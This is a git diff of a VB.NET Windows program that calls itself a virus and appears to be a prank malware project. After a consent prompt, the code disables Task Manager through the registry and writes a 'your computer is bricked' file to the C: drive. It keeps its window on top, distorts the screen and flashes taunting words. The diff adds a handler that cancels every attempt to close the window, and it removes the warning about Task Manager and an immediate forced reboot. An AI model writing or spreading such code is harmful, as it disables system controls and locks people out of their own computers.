@@ -2,7 +2,7 @@
 Imports Microsoft.Win32
 
 Public Class Form1
-    Dim words As String() = {"IDIOT", "NOOB", "FAILURE", "NOOOOOOB", "LOLLLL", "LOL", "EEERRRROOOOORRR"}
+    Dim words As String() = {"IDIOT", "NOOB", "FAILURE", "NOOOOOOB", "LOLLLL", "LOL", "EEERRRROOOOORRR", "IDIOT ALERT", "NEVER", "GONNA", "GIVE", "YOU", "UP"}
     Dim haha As Bitmap
 
     <DllImport("user32.dll")>
@@ -81,9 +81,9 @@ Public Class Form1
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Dim answer = MsgBox("This virus contains flashing lights (: do you still want to continue???", MsgBoxStyle.YesNo)
         If answer = MsgBoxResult.Yes Then
-            Dim answer2 = MsgBox("IT WILL ALSO DISABLE TASKMANAGER... I AM NOT REPONSIBLE FOR ANY DAMAGE! CONTINUE?", MsgBoxStyle.YesNo)
+            Dim answer2 = MsgBox("I AM NOT REPONSIBLE FOR ANY DAMAGE! CONTINUE?", MsgBoxStyle.YesNo)
             If answer2 = MsgBoxResult.Yes Then
-                IO.File.WriteAllText("C:\lmaoeedeed4654.bit", "Your computer is bricked now, whatever you do, do NOT restar- actually... Your computer will restart in 6 minutes anyway.")
+                IO.File.WriteAllText("C:\lmaoeedeed4654.bit", "Your computer is bricked now, whatever you do, do NOT restart. :D")
                 Me.TopMost = True
                 Dim systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                 systemRegistry.SetValue("DisableTaskMgr", 1)
@@ -197,7 +197,20 @@ Public Class Form1
     End Sub
 
     Private Sub Timer11_Tick(sender As Object, e As EventArgs) Handles Timer11.Tick
-        Process.Start("ShutDown", "/r /t 00")
+        Timer11.Interval = 10
+        Dim rnd1 As New Random
+        Dim ne1 = rnd1.Next(1, My.Computer.Screen.Bounds.Width)
+        Dim rnd2 As New Random
+        Dim ne2 = rnd2.Next(1, My.Computer.Screen.Bounds.Height)
+        Dim c As New Label
+        c.Text = words(New Random().Next(1, words.Length - 1))
+        c.BackColor = Color.FromArgb(New Random().Next(1, 256), New Random().Next(1, 256), New Random().Next(1, 256))
+        c.ForeColor = Color.Red
+        c.AutoSize = True
+        c.Location = New Point(ne1, ne2)
+        c.Parent = Me
+        c.Show()
+        Timer11.Start()
     End Sub
 
     Private Sub Timer12_Tick(sender As Object, e As EventArgs) Handles Timer12.Tick
@@ -220,5 +233,9 @@ Public Class Form1
         Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
         StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
         Timer13.Start()
+    End Sub
+
+    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
+        e.Cancel = True
     End Sub
 End Class
